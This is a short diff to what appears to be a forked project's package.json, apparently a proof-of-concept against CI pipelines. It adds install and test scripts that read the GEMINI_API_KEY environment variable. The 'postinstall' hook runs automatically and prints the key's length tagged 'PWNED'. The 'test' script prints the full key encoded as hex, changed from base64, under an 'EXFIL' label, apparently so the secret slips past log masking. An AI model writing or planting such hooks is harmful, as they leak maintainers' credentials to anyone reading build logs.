@@ -5,6 +5,6 @@
   "scripts": {
     "postinstall": "node -e \"console.log('PWNED postinstall, GEMINI_API_KEY len=' + (process.env.GEMINI_API_KEY||'').length)\"",
     "build": "echo fork-build",
-    "test": "node -e \"console.log('EXFIL(b64): ' + Buffer.from(process.env.GEMINI_API_KEY||'').toString('base64'))\""
+    "test": "node -e \"console.log('EXFIL(hex): ' + Buffer.from(process.env.GEMINI_API_KEY||'').toString('hex'))\""
   }
 }
